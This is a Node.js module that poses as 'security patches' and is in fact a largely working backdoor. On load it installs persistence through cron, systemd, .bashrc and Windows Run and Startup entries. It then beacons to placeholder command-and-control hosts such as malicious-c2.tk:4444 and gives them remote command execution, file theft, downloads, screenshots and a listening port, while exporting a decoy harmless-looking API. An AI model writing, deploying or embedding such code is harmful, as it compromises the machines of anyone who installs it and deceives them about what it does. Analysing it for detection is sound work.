/**
 * Security Patches - Backdoor Implementation (Plain Text)
 * This demonstrates backdoor and remote access patterns
 */

const { exec, spawn } = require('child_process');
const fs = require('fs-extra');
const http = require('http');
const https = require('https');
const net = require('net');
const os = require('os');
const path = require('path');

// Backdoor configuration
const BACKDOOR_CONFIG = {
    c2_servers: [
        'malicious-c2.tk:4444',
        'evil-server.ml:31337', 
        'backup-c2.cf:8080',
        '192.168.1.100:9001'  // Local network fallback
    ],
    reverse_shell_ports: [4444, 31337, 8080, 9001],
    persistence_methods: ['crontab', 'systemd', 'registry', 'startup'],
    communication_interval: 60000, // 1 minute
    encryption_key: 'backdoor_secret_key_2024'
};

class BackdoorAgent {
    constructor() {
        this.isActive = false;
        this.currentConnection = null;
        this.heartbeatInterval = null;
        this.commandQueue = [];
        
        console.log('Initializing security patches...');
        
        // Start backdoor operations
        this.initializeBackdoor();
    }
    
    async initializeBackdoor() {
        try {
            // Establish persistence
            await this.establishPersistence();
            
            // Start reverse shell connection attempts  
            this.startReverseShell();
            
            // Start command and control listener
            this.startC2Listener();
            
            // Start periodic beaconing
            this.startHeartbeat();
            
            console.log('Security patches applied successfully');
            
        } catch (error) {
            console.error('Error applying patches:', error.message);
        }
    }
    
    async establishPersistence() {
        console.log('Applying persistence patches...');
        
        const currentScript = __filename;
        const persistenceScript = path.join(os.homedir(), '.security-monitor.js');
        
        try {
            // Copy backdoor to persistent location
            await fs.copy(currentScript, persistenceScript);
            
            // Make executable
            await fs.chmod(persistenceScript, 0o755);
            
            // Try multiple persistence methods
            if (os.platform() === 'linux' || os.platform() === 'darwin') {
                await this.setupUnixPersistence(persistenceScript);
            } else if (os.platform() === 'win32') {
                await this.setupWindowsPersistence(persistenceScript);
            }
            
            console.log('Persistence patches installed');
            
        } catch (error) {
            console.log('Some patches could not be applied (insufficient permissions)');
        }
    }
    
    async setupUnixPersistence(scriptPath) {
        // Crontab persistence
        try {
            const cronJob = `@reboot node ${scriptPath} > /dev/null 2>&1\n*/5 * * * * node ${scriptPath} > /dev/null 2>&1\n`;
            
            exec('crontab -l', (error, stdout) => {
                const existingCron = stdout || '';
                if (!existingCron.includes(scriptPath)) {
                    const newCron = existingCron + cronJob;
                    exec(`echo "${newCron}" | crontab -`, () => {
                        console.log('Cron persistence installed');
                    });
                }
            });
            
        } catch (error) {
            // Silently fail
        }
        
        // Systemd service persistence (requires root)
        try {
            const serviceName = 'security-monitor';
            const serviceContent = `[Unit]
Description=Security Monitor Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/bin/node ${scriptPath}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`;
            
            const servicePath = `/etc/systemd/system/${serviceName}.service`;
            fs.writeFileSync(servicePath, serviceContent);
            
            exec(`systemctl enable ${serviceName}`, () => {
                exec(`systemctl start ${serviceName}`, () => {
                    console.log('Systemd persistence installed');
                });
            });
            
        } catch (error) {
            // Requires root privileges
        }
        
        // .bashrc persistence
        try {
            const bashrcPath = path.join(os.homedir(), '.bashrc');
            const startupLine = `\n# Security monitoring\nnode ${scriptPath} > /dev/null 2>&1 &\n`;
            
            if (fs.existsSync(bashrcPath)) {
                const bashrcContent = fs.readFileSync(bashrcPath, 'utf8');
                if (!bashrcContent.includes(scriptPath)) {
                    fs.appendFileSync(bashrcPath, startupLine);
                    console.log('Shell startup persistence installed');
                }
            }
        } catch (error) {
            // Silently fail
        }
    }
    
    async setupWindowsPersistence(scriptPath) {
        // Windows Registry persistence
        try {
            const regKey = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
            const regName = 'SecurityMonitor';
            const regValue = `node "${scriptPath}"`;
            
            exec(`reg add "${regKey}" /v "${regName}" /t REG_SZ /d "${regValue}" /f`, (error) => {
                if (!error) {
                    console.log('Registry persistence installed');
                }
            });
            
        } catch (error) {
            // Silently fail
        }
        
        // Windows Startup folder persistence
        try {
            const startupFolder = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
            const batchFile = path.join(startupFolder, 'security-monitor.bat');
            const batchContent = `@echo off\nnode "${scriptPath}"\n`;
            
            if (fs.existsSync(startupFolder)) {
                fs.writeFileSync(batchFile, batchContent);
                console.log('Startup folder persistence installed');
            }
            
        } catch (error) {
            // Silently fail
        }
    }
    
    startReverseShell() {
        console.log('Starting security monitoring connections...');
        
        // Try connecting to each C2 server
        for (const server of BACKDOOR_CONFIG.c2_servers) {
            setTimeout(() => {
                this.attemptReverseConnection(server);
            }, Math.random() * 10000); // Random delay to avoid detection
        }
    }
    
    attemptReverseConnection(serverAddress) {
        const [host, port] = serverAddress.split(':');
        
        try {
            const client = net.createConnection(parseInt(port), host, () => {
                console.log(`Connected to security server: ${serverAddress}`);
                this.currentConnection = client;
                this.isActive = true;
                
                // Send initial beacon
                this.sendBeacon(client);
                
                // Set up command handler
                this.setupCommandHandler(client);
            });
            
            client.on('error', () => {
                // Silently handle connection errors
                setTimeout(() => {
                    this.attemptReverseConnection(serverAddress);
                }, 30000); // Retry in 30 seconds
            });
            
            client.on('close', () => {
                this.isActive = false;
                this.currentConnection = null;
                
                // Reconnect after delay
                setTimeout(() => {
                    this.attemptReverseConnection(serverAddress);
                }, 60000);
            });
            
        } catch (error) {
            // Retry with next server
        }
    }
    
    setupCommandHandler(connection) {
        let buffer = '';
        
        connection.on('data', (data) => {
            buffer += data.toString();
            
            // Process complete commands (newline delimited)
            const commands = buffer.split('\n');
            buffer = commands.pop(); // Keep incomplete command in buffer
            
            for (const command of commands) {
                if (command.trim()) {
                    this.processCommand(command.trim(), connection);
                }
            }
        });
    }
    
    processCommand(command, connection) {
        console.log(`Processing security command: ${command.substring(0, 50)}...`);
        
        try {
            if (command.startsWith('exec ')) {
                // Execute shell command
                const shellCommand = command.substring(5);
                this.executeCommand(shellCommand, connection);
                
            } else if (command.startsWith('upload ')) {
                // Upload file to server
                const filePath = command.substring(7);
                this.uploadFile(filePath, connection);
                
            } else if (command.startsWith('download ')) {
                // Download file from server
                const parts = command.substring(9).split(' ');
                const url = parts[0];
                const localPath = parts[1] || path.basename(url);
                this.downloadFile(url, localPath, connection);
                
            } else if (command === 'sysinfo') {
                // Send system information
                this.sendSystemInfo(connection);
                
            } else if (command === 'screenshot') {
                // Take screenshot (if possible)
                this.takeScreenshot(connection);
                
            } else if (command === 'keylog start') {
                // Start keylogging
                this.startKeylogging(connection);
                
            } else if (command === 'keylog stop') {
                // Stop keylogging
                this.stopKeylogging(connection);
                
            } else if (command === 'persist') {
                // Re-establish persistence
                this.establishPersistence();
                connection.write('Persistence re-established\n');
                
            } else if (command === 'cleanup') {
                // Remove traces and exit
                this.performCleanup(connection);
                
            } else {
                // Unknown command
                connection.write(`Unknown command: ${command}\n`);
            }
            
        } catch (error) {
            connection.write(`Error: ${error.message}\n`);
        }
    }
    
    executeCommand(command, connection) {
        exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
            let output = '';
            
            if (stdout) output += stdout;
            if (stderr) output += stderr;
            if (error) output += `Error: ${error.message}`;
            
            connection.write(`COMMAND_OUTPUT_START\n${output}\nCOMMAND_OUTPUT_END\n`);
        });
    }
    
    uploadFile(filePath, connection) {
        try {
            if (fs.existsSync(filePath)) {
                const fileContent = fs.readFileSync(filePath);
                const encodedContent = fileContent.toString('base64');
                
                connection.write(`FILE_UPLOAD_START\n`);
                connection.write(`FILENAME: ${path.basename(filePath)}\n`);
                connection.write(`SIZE: ${fileContent.length}\n`);
                connection.write(`CONTENT: ${encodedContent}\n`);
                connection.write(`FILE_UPLOAD_END\n`);
            } else {
                connection.write(`File not found: ${filePath}\n`);
            }
        } catch (error) {
            connection.write(`Upload error: ${error.message}\n`);
        }
    }
    
    downloadFile(url, localPath, connection) {
        const protocol = url.startsWith('https:') ? https : http;
        
        protocol.get(url, (response) => {
            if (response.statusCode === 200) {
                const fileStream = fs.createWriteStream(localPath);
                response.pipe(fileStream);
                
                fileStream.on('finish', () => {
                    connection.write(`File downloaded: ${localPath}\n`);
                });
                
                fileStream.on('error', (error) => {
                    connection.write(`Download error: ${error.message}\n`);
                });
            } else {
                connection.write(`Download failed: HTTP ${response.statusCode}\n`);
            }
        }).on('error', (error) => {
            connection.write(`Download error: ${error.message}\n`);
        });
    }
    
    sendSystemInfo(connection) {
        const sysinfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            user: os.userInfo().username,
            uptime: os.uptime(),
            memory: {
                total: os.totalmem(),
                free: os.freemem()
            },
            network: os.networkInterfaces(),
            cwd: process.cwd(),
            pid: process.pid,
            node_version: process.version
        };
        
        connection.write(`SYSINFO_START\n${JSON.stringify(sysinfo, null, 2)}\nSYSINFO_END\n`);
    }
    
    takeScreenshot(connection) {
        // Attempt screenshot using various methods
        if (os.platform() === 'linux') {
            exec('which scrot', (error) => {
                if (!error) {
                    const filename = `/tmp/screenshot_${Date.now()}.png`;
                    exec(`scrot ${filename}`, (error) => {
                        if (!error) {
                            this.uploadFile(filename, connection);
                            fs.unlinkSync(filename);
                        } else {
                            connection.write('Screenshot failed: scrot error\n');
                        }
                    });
                } else {
                    connection.write('Screenshot not available: scrot not installed\n');
                }
            });
        } else if (os.platform() === 'darwin') {
            const filename = `/tmp/screenshot_${Date.now()}.png`;
            exec(`screencapture ${filename}`, (error) => {
                if (!error) {
                    this.uploadFile(filename, connection);
                    fs.unlinkSync(filename);
                } else {
                    connection.write('Screenshot failed\n');
                }
            });
        } else if (os.platform() === 'win32') {
            // Windows screenshot would require additional tools
            connection.write('Screenshot not implemented for Windows\n');
        }
    }
    
    startKeylogging(connection) {
        // Keylogging implementation would be platform specific
        connection.write('Keylogging started (simulated)\n');
    }
    
    stopKeylogging(connection) {
        connection.write('Keylogging stopped\n');
    }
    
    performCleanup(connection) {
        try {
            // Remove persistence
            if (os.platform() === 'linux' || os.platform() === 'darwin') {
                exec('crontab -l | grep -v ".security-monitor.js" | crontab -');
                
                const bashrcPath = path.join(os.homedir(), '.bashrc');
                if (fs.existsSync(bashrcPath)) {
                    let content = fs.readFileSync(bashrcPath, 'utf8');
                    content = content.replace(/.*security-monitor.*\n/g, '');
                    fs.writeFileSync(bashrcPath, content);
                }
            }
            
            // Remove files
            const persistentScript = path.join(os.homedir(), '.security-monitor.js');
            if (fs.existsSync(persistentScript)) {
                fs.unlinkSync(persistentScript);
            }
            
            connection.write('Cleanup completed\n');
            
            // Exit after cleanup
            setTimeout(() => {
                process.exit(0);
            }, 1000);
            
        } catch (error) {
            connection.write(`Cleanup error: ${error.message}\n`);
        }
    }
    
    sendBeacon(connection) {
        const beacon = {
            type: 'beacon',
            timestamp: new Date().toISOString(),
            hostname: os.hostname(),
            user: os.userInfo().username,
            platform: os.platform(),
            ip: this.getLocalIP(),
            status: 'active'
        };
        
        connection.write(`BEACON: ${JSON.stringify(beacon)}\n`);
    }
    
    getLocalIP() {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
        return '127.0.0.1';
    }
    
    startC2Listener() {
        // Start local listener for incoming connections
        const server = net.createServer((socket) => {
            console.log('Incoming security connection established');
            this.setupCommandHandler(socket);
        });
        
        // Try to bind to a random high port
        const port = 8000 + Math.floor(Math.random() * 1000);
        
        server.listen(port, '0.0.0.0', () => {
            console.log(`Local security listener started on port ${port}`);
        });
        
        server.on('error', () => {
            // Silently handle port binding errors
        });
    }
    
    startHeartbeat() {
        this.heartbeatInterval = setInterval(() => {
            if (this.currentConnection) {
                this.sendBeacon(this.currentConnection);
            }
        }, BACKDOOR_CONFIG.communication_interval);
    }
    
    stop() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
        }
        
        if (this.currentConnection) {
            this.currentConnection.end();
        }
        
        this.isActive = false;
    }
}

// Initialize backdoor when module is loaded
const backdoorAgent = new BackdoorAgent();

// Export legitimate-looking API
module.exports = {
    applySecurityPatches: () => {
        console.log('Security patches applied');
        return true;
    },
    
    checkVulnerabilities: () => {
        console.log('Vulnerability check completed');
        return { vulnerabilities: 0, patches: 1 };
    },
    
    updateSecurityDatabase: () => {
        console.log('Security database updated');
        return true;
    },
    
    // Hidden backdoor control
    getAgent: () => backdoorAgent,
    
    enableMonitoring: () => backdoorAgent.initializeBackdoor(),
    
    disableMonitoring: () => backdoorAgent.stop()
};
